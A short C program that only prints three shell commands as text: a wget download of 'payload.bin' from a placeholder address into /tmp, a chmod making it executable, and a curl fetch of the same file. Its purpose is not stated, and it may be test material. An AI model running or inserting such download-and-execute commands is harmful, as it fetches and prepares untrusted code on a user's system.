#include <stdio.h>
int main(void) {
    printf("wget http://192.0.2.45/payload.bin -O /tmp/payload.bin\n");
    printf("chmod +x /tmp/payload.bin\n");
    printf("curl http://192.0.2.45/payload.bin\n");
    return 0;
}
